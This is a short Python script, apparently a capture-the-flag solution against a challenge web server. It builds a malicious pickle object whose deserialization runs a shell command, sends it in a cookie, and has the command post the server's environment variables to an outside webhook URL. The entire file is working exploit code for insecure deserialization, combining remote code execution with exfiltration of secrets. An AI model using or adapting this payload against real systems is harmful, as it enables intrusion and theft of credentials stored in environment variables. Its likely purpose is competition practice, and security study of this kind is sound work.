#!/usr/bin/env python3

import os
import pickle
import base64
import requests

CMD = 'curl https://webhook.site/1931818d-952e-4226-b996-a0fcf4b76c9a --data "env=$(env)"'

class RunCmd(object):
    def __reduce__(self):
        return(os.system, (CMD,))

payload = str(base64.b64encode(pickle.dumps(RunCmd())))[2:-1]

cookie = {
	'contents': payload
}

r = requests.get("https://jar.2021.chall.actf.co/", cookies=cookie)